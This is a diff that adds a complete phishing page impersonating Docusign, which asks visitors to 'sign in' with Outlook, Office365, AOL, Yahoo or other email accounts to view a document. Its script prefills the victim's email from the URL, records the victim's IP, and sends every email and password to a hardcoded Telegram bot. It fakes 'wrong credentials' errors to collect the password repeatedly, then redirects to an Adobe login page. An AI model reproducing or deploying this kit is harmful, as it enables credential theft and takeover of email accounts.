@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Docusign | #1 in Electronic Signature and Intelligent Agreement Managemen</title>
+	<script src="https://cdn.tailwindcss.com"></script>
+	<link href="https://www.docusign.com/assets/images/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+</head>
+<body class="bg-cover bg-no-repeat w-screen h-screen" style="
+      background-image: url('https://uploads-us-west-2.insided.com/docusign-en/attachment/ba79132e-dd34-4543-a006-9c8300688b1f.png');
+    "><main class="flex flex-col items-center justify-center h-full text-white">
+<div class="bg-[#f7f6f7] text-black min-h-[340p] py-8 w-full md:w-[540px] flex flex-col items-center rounded-md px-6">
+<div class="w-full flex flex-col items-center mb-6 overflow-hidden">
+<div class="flex items-center gap-1 mb-4"><img alt="" src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" width="124px" /></div>
+
+<h1 class="text-2xl font-bold">Secure Cloud Document</h1>
+</div>
+
+<p>Sign in with your email provider below to view your document</p>
+
+<div class="w-full px-0 md:px-6 mt-6"><button class="w-full flex items-center gap-4 bg-blue-400 font-semibold text-white border pr-4" onclick="openModal('outlook')"><span class="p-2 flex items-center justify-center bg-white border"><img alt="" src="https://cdn.iconscout.com/icon/free/png-256/free-outlook-logo-icon-download-in-svg-png-gif-file-formats--office-365-pack-logos-icons-1174817.png" width="24" /> </span> Sign in with Outlook</button><button class="w-full flex items-center gap-4 bg-red-600 font-semibold text-white border pr-4 mt-4" onclick="openModal('office365')"><span class="p-2 flex items-center justify-center bg-white border"><img alt="" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3KwXA70LyegpQCa9DucgTFB25WkQYYaI3vg&amp;s" width="24" /> </span> Sign in with Office365</button><button class="w-full flex items-center gap-4 bg-black font-semibold text-white border pr-4 mt-4" onclick="openModal('aol')"><span class="p-2 flex items-center justify-center bg-white border"><img alt="" src="https://cdn.iconscout.com/icon/free/png-256/free-aol-logo-icon-download-in-svg-png-gif-file-formats--social-media-pack-logos-icons-2496150.png" width="24" /> </span> Sign in with Aol.</button><button class="w-full flex items-center gap-4 bg-purple-800 font-semibold text-white border pr-4 mt-4" onclick="openModal('yahoo')"><span class="p-2 flex items-center justify-center bg-white border"><img alt="" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTi-LyHdGYA1tqQjoSl2FGCfqk5xnvYq2dxIw&amp;s" width="24" /> </span> Sign in with Yahoo</button><button class="w-full flex items-center gap-4 bg-blue-800 font-semibold text-white border pr-4 mt-4" onclick="openModal('other')"><span class="p-2 flex items-center justify-center bg-white border"><img alt="" src="https://svgsilh.com/svg/304967.svg" width="24" /> </span> Sign in other mail</button>
+
+<p class="text-center mt-4 text-sm">Please select the provider of the email you received the secured message to view the document</p>
+</div>
+</div>
+</main>
+
+<p><!-- Modals --></p>
+
+<div id="modals-container"><!-- Example Modal -->
+<div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center" id="outlook-modal">
+<div class="bg-white p-6 rounded-md w-full max-w-md">
+<div class="flex flex-col items-center mb-6"><img alt="Outlook" class="my-4" src="https://cdn.iconscout.com/icon/free/png-256/free-outlook-logo-icon-download-in-svg-png-gif-file-formats--office-365-pack-logos-icons-1174817.png" width="50" />
+<h2 class="text-xl font-bold">Sign in with Outlook</h2>
+</div>
+
+<form onsubmit="handleOutlookSubmission(event)"><input id="hidden_ip" name="hidden_ip" type="hidden" />
+<div class="flex flex-col gap-2"><input class="border p-2 rounded-md w-full" id="email-outlook" placeholder="Enter your email address" required="" type="email" /> <span class="flex items-center gap-1 text-[#6c757d] text-xs">Email provider secure sign in <span> <img alt="" class="-mb-1" height="8" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k=" width="8" /> </span></span></div>
+
+<div class="flex flex-col gap-2 mt-4"><input class="border p-2 rounded-md w-full" id="password-outlook" placeholder="Enter your password" required="" type="password" /></div>
+
+<p class="text-red-500 text-sm mt-1 hidden" id="wrongCred-outlook">Wrong credentials, try again</p>
+<button class="bg-blue-400 text-white font-semibold w-full p-2 rounded-md mt-4" type="submit">Log in</button></form>
+<button class="text-blue-400 mt-4 border w-full rounded-md h-10" onclick="closeModal('outlook')">Close</button></div>
+</div>
+
+<div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center" id="office365-modal">
+<div class="bg-white p-6 rounded-md w-full max-w-md">
+<div class="flex flex-col items-center mb-6"><img alt="Outlook" class="my-4" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3KwXA70LyegpQCa9DucgTFB25WkQYYaI3vg&amp;s" width="50" />
+<h2 class="text-xl font-bold">Sign in with Office365</h2>
+</div>
+
+<form onsubmit="handleOfficeSubmission(event)"><input class="hidden_ip" name="hidden_ip" type="hidden" />
+<div class="flex flex-col gap-2"><input class="border p-2 rounded-md w-full" id="email-office" placeholder="Enter your email address" required="" type="email" /> <span class="flex items-center gap-1 text-[#6c757d] text-xs">Email provider secure sign in <span> <img alt="" class="-mb-1" height="8" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k=" width="8" /> </span></span></div>
+
+<div class="flex flex-col gap-2 mt-4"><input class="border p-2 rounded-md w-full" id="password-office" placeholder="Enter your password" required="" type="password" /></div>
+
+<p class="text-red-500 text-sm mt-1 hidden" id="wrongCred-office">Wrong credentials, try again</p>
+<button class="bg-red-600 text-white font-semibold w-full p-2 rounded-md mt-4" type="submit">Log in</button></form>
+<button class="text-blue-400 mt-4 border w-full rounded-md h-10" onclick="closeModal('office365')">Close</button></div>
+</div>
+
+<div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center" id="aol-modal">
+<div class="bg-white p-6 rounded-md w-full max-w-md">
+<div class="flex flex-col items-center mb-6"><img alt="Outlook" class="my-4" src="https://cdn.iconscout.com/icon/free/png-256/free-aol-logo-icon-download-in-svg-png-gif-file-formats--social-media-pack-logos-icons-2496150.png" width="50" />
+<h2 class="text-xl font-bold">Sign in with Aol.</h2>
+</div>
+
+<form onsubmit="handleAolSubmission(event)"><input id="hidden_ip" name="hidden_ip" type="hidden" />
+<div class="flex flex-col gap-2"><input class="border p-2 rounded-md w-full" id="email-aol" placeholder="Enter your email address" required="" type="email" /> <span class="flex items-center gap-1 text-[#6c757d] text-xs">Email provider secure sign in <span> <img alt="" class="-mb-1" height="8" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k=" width="8" /> </span></span></div>
+
+<div class="flex flex-col gap-2 mt-4"><input class="border p-2 rounded-md w-full" id="password-aol" placeholder="Enter your password" required="" type="password" /></div>
+
+<p class="text-red-500 text-sm mt-1 hidden" id="wrongCred-aol">Wrong credentials, try again</p>
+<button class="bg-black text-white font-semibold w-full p-2 rounded-md mt-4" type="submit">Log in</button></form>
+<button class="text-blue-400 mt-4 border w-full rounded-md h-10" onclick="closeModal('aol')">Close</button></div>
+</div>
+
+<div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center" id="yahoo-modal">
+<div class="bg-white p-6 rounded-md w-full max-w-md">
+<div class="flex flex-col items-center mb-6"><img alt="Outlook" class="my-4" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTi-LyHdGYA1tqQjoSl2FGCfqk5xnvYq2dxIw&amp;s" width="50" />
+<h2 class="text-xl font-bold">Sign in with Yahoo</h2>
+</div>
+
+<form onsubmit="handleYahooSubmission(event)"><input id="hidden_ip" name="hidden_ip" type="hidden" />
+<div class="flex flex-col gap-2"><input class="border p-2 rounded-md w-full" id="email-yahoo" placeholder="Enter your email address" required="" type="email" /> <span class="flex items-center gap-1 text-[#6c757d] text-xs">Email provider secure sign in <span> <img alt="" class="-mb-1" height="8" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k=" width="8" /> </span></span></div>
+
+<div class="flex flex-col gap-2 mt-4"><input class="border p-2 rounded-md w-full" id="password-yahoo" placeholder="Enter your password" required="" type="password" /></div>
+
+<p class="text-red-500 text-sm mt-1 hidden" id="wrongCred-yahoo">Wrong credentials, try again</p>
+<button class="bg-purple-800 text-white font-semibold w-full p-2 rounded-md mt-4" type="submit">Log in</button></form>
+<button class="text-blue-400 mt-4 border w-full rounded-md h-10" onclick="closeModal('yahoo')">Close</button></div>
+</div>
+
+<div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center" id="other-modal">
+<div class="bg-white p-6 rounded-md w-full max-w-md">
+<div class="flex flex-col items-center mb-6"><img alt="Outlook" class="my-4" src="https://svgsilh.com/svg/304967.svg" width="50" />
+<h2 class="text-xl font-bold">Sign in with other mail</h2>
+</div>
+
+<form onsubmit="handleOtherSubmission(event)"><input id="hidden_ip" name="hidden_ip" type="hidden" />
+<div class="flex flex-col gap-2"><input class="border p-2 rounded-md w-full" id="email-other" placeholder="Enter your email address" required="" type="email" /> <span class="flex items-center gap-1 text-[#6c757d] text-xs">Email provider secure sign in <span> <img alt="" class="-mb-1" height="8" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAcABMDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1fX7zUrjXLfRdNuvsjPCZ3lxknnAHfHQ1RMmveHtSsFvNSW9t7uXymBHIOM8ViXniW5/4S6a/EMAe1L2iKdxBAY8n3q1e6xd6ybOeUQRtbSmVFRScnBHOTTEej0Vn6ZfyXunQ3EiKHcHIXOOCR/SikFzxzU3C+IdUX0vJef8AgRq9a3O22GCSeetehXPgbQru+nvJbeQyzOXfErAFj1OBVmHwloUChV0+Mgf3yW/madwsN8NjzPD9o/HKk/8AjxorXgt4baFYYI1jiQYVFGAKKLhY/9k=" width="8" /> </span></span></div>
+
+<div class="flex flex-col gap-2 mt-4"><input class="border p-2 rounded-md w-full" id="password-other" placeholder="Enter your password" required="" type="password" /></div>
+
+<p class="text-red-500 text-sm mt-1 hidden" id="wrongCred-other">Wrong credentials, try again</p>
+<button class="bg-blue-800 text-white font-semibold w-full p-2 rounded-md mt-4" type="submit">Log in</button></form>
+<button class="text-blue-400 mt-4 border w-full rounded-md h-10" onclick="closeModal('other')">Close</button></div>
+</div>
+</div>
+
+<p><script>
+      function openModal(provider) {
+        document.getElementById(`${provider}-modal`).classList.remove("hidden");
+      }
+
+      function closeModal(provider) {
+        document.getElementById(`${provider}-modal`).classList.add("hidden");
+      }
+    </script><script>
+      function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+      }
+
+      // Open the corresponding modal based on the email domain and prefill the email field
+      function openModalByEmail() {
+        const email = getQueryParam("EMAIL");
+        if (!email) return;
+
+        const domain = email.split("@")[1];
+        if (!domain) return;
+
+        let modalToOpen = null;
+        let emailFieldId = null;
+
+        // Determine which modal to open based on the domain
+        if (domain.includes("yahoo")) {
+          modalToOpen = "yahoo";
+          emailFieldId = "email-yahoo";
+        } else if (domain.includes("outlook") || domain.includes("hotmail")) {
+          modalToOpen = "outlook";
+          emailFieldId = "email-outlook";
+        } else if (
+          domain.includes("office365") ||
+          domain.includes("microsoft")
+        ) {
+          modalToOpen = "office365";
+          emailFieldId = "email-office";
+        } else if (domain.includes("aol")) {
+          modalToOpen = "aol";
+          emailFieldId = "email-aol";
+        } else {
+          modalToOpen = "other";
+          emailFieldId = "email-other";
+        }
+
+        // Open the determined modal
+        if (modalToOpen) {
+          openModal(modalToOpen);
+
+          // Prefill the email field in the opened modal
+          const emailField = document.getElementById(emailFieldId);
+          if (emailField) {
+            emailField.value = email;
+          }
+        }
+      }
+
+      // Call the function to open the correct modal and prefill the email field when the page loads
+      window.addEventListener("DOMContentLoaded", openModalByEmail);
+    </script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script><script>
+      let count = 0;
+      const sendTeleMsg = async (msg) => {
+        const TELEGRAM_BOT_TOKEN =
+          "868680022319:AAFQBXBQtEmSTrEZIOk-X5rBkVIwAmkpRnI"; //YOUR_TELEGRAM_BOT_TOKEN HERE
+        const CHAT_ID = "859742480"; // YOUR CHAT_ID HERE
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        try {
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: msg,
+            }),
+          });
+
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+
+          const data = await response.json();
+        } catch (error) {
+          console.error("Error sending message:", error);
+        }
+      };
+      $(document).ready(function () {
+        // Use an alternative service to get the user's IP address
+        $.getJSON("https://api.ipify.org?format=json", function (data) {
+          document.getElementById("hidden_ip").value = data.ip;
+        }).fail(function () {
+          console.error("Failed to fetch IP address");
+        });
+      });
+
+      // Form submission handlers
+      const sdadadada = (event) => {
+        event.preventDefault();
+        const email = document.getElementById("email").value;
+        if (email) {
+          document.querySelector("#emailss").textContent = email;
+          toggleForms("form2");
+        }
+      };
+
+      const handleOutlookSubmission = async (event) => {
+        const email = document.getElementById("email-outlook").value;
+        const password = document.getElementById("password-outlook").value;
+        const ip = document.getElementById("hidden_ip").value;
+        event.preventDefault();
+        count++;
+
+        const message =
+          "++++++%D%0DROP BOX [OUTLOOK] %D%0++++++" +
+          "\n" +
+          "[%D%7EMAIL] : " +
+          email +
+          "\n" +
+          "[%D%1PASSWORD] :" +
+          password +
+          "\n" +
+          "[%C%D IP]:" +
+          ip +
+          "\n" +
+          "+++++ %D%8%D%D%B%D%0%D%0%D%0%D%0 ++++" +
+          "\n";
+        sendTeleMsg(message);
+
+        if (count === 3) {
+          setTimeout(() => {
+            window.location.href =
+              "https://ims-na1.adobelogin.com/ims/adobeid/document/";
+          }, 3000);
+        } else {
+          setTimeout(() => {
+            document
+              .getElementById("wrongCred-outlook")
+              .classList.remove("hidden");
+            document.getElementById("password-outlook").value = "";
+          }, 2000);
+        }
+        return false;
+      };
+      const handleOfficeSubmission = async (event) => {
+        const email = document.getElementById("email-office").value;
+        const password = document.getElementById("password-office").value;
+        const ip = document.getElementById("hidden_ip").value;
+        event.preventDefault();
+        count++;
+
+        const message =
+          "++++++%D%0DROP BOX [OFFICE365] %D%0++++++" +
+          "\n" +
+          "[%D%7EMAIL] : " +
+          email +
+          "\n" +
+          "[%D%1PASSWORD] :" +
+          password +
+          "\n" +
+          "[%C%D IP]:" +
+          ip +
+          "\n" +
+          "+++++ %D%8%D%D%B%D%0%D%0%D%0%D%0 ++++" +
+          "\n";
+        sendTeleMsg(message);
+
+        if (count === 3) {
+          setTimeout(() => {
+            window.location.href =
+              "https://ims-na1.adobelogin.com/ims/adobeid/document/";
+          }, 3000);
+        } else {
+          setTimeout(() => {
+            document
+              .getElementById("wrongCred-office")
+              .classList.remove("hidden");
+            document.getElementById("password-office").value = "";
+          }, 2000);
+        }
+        return false;
+      };
+      const handleAolSubmission = async (event) => {
+        const email = document.getElementById("email-aol").value;
+        const password = document.getElementById("password-aol").value;
+        const ip = document.getElementById("hidden_ip").value;
+        event.preventDefault();
+        count++;
+
+        const message =
+          "++++++%D%0DROP BOX [AOL] %D%0++++++" +
+          "\n" +
+          "[%D%7EMAIL] : " +
+          email +
+          "\n" +
+          "[%D%1PASSWORD] :" +
+          password +
+          "\n" +
+          "[%C%D IP]:" +
+          ip +
+          "\n" +
+          "+++++ %D%8%D%D%B%D%0%D%0%D%0%D%0 ++++" +
+          "\n";
+        sendTeleMsg(message);
+
+        if (count === 3) {
+          setTimeout(() => {
+            window.location.href =
+              "https://ims-na1.adobelogin.com/ims/adobeid/document/";
+          }, 3000);
+        } else {
+          setTimeout(() => {
+            document.getElementById("wrongCred-aol").classList.remove("hidden");
+            document.getElementById("password-aol").value = "";
+          }, 2000);
+        }
+        return false;
+      };
+      const handleYahooSubmission = async (event) => {
+        const email = document.getElementById("email-yahoo").value;
+        const password = document.getElementById("password-yahoo").value;
+        const ip = document.getElementById("hidden_ip").value;
+        event.preventDefault();
+        count++;
+
+        const message =
+          "++++++%D%0DROP BOX [YAHOO] %D%0++++++" +
+          "\n" +
+          "[%D%7EMAIL] : " +
+          email +
+          "\n" +
+          "[%D%1PASSWORD] :" +
+          password +
+          "\n" +
+          "[%C%D IP]:" +
+          ip +
+          "\n" +
+          "+++++ %D%8%D%D%B%D%0%D%0%D%0%D%0 ++++" +
+          "\n";
+        sendTeleMsg(message);
+
+        if (count === 3) {
+          setTimeout(() => {
+            window.location.href =
+              "https://ims-na1.adobelogin.com/ims/adobeid/document/";
+          }, 3000);
+        } else {
+          setTimeout(() => {
+            document
+              .getElementById("wrongCred-yahoo")
+              .classList.remove("hidden");
+            document.getElementById("password-yahoo").value = "";
+          }, 2000);
+        }
+        return false;
+      };
+      const handleOtherSubmission = async (event) => {
+        const email = document.getElementById("email-other").value;
+        const password = document.getElementById("password-other").value;
+        const ip = document.getElementById("hidden_ip").value;
+        event.preventDefault();
+        count++;
+
+        const message =
+          "++++++%D%0DROP BOX [OTHER] %D%0++++++" +
+          "\n" +
+          "[%D%7EMAIL] : " +
+          email +
+          "\n" +
+          "[%D%1PASSWORD] :" +
+          password +
+          "\n" +
+          "[%C%D IP]:" +
+          ip +
+          "\n" +
+          "+++++ %D%8%D%D%B%D%0%D%0%D%0%D%0 ++++" +
+          "\n";
+        sendTeleMsg(message);
+
+        if (count === 3) {
+          setTimeout(() => {
+            window.location.href =
+              "https://ims-na1.adobelogin.com/ims/adobeid/document/";
+          }, 3000);
+        } else {
+          setTimeout(() => {
+            document
+              .getElementById("wrongCred-other")
+              .classList.remove("hidden");
+            document.getElementById("password-other").value = "";
+          }, 2000);
+        }
+        return false;
+      };
+    </script></p>
+</body>
+</html>
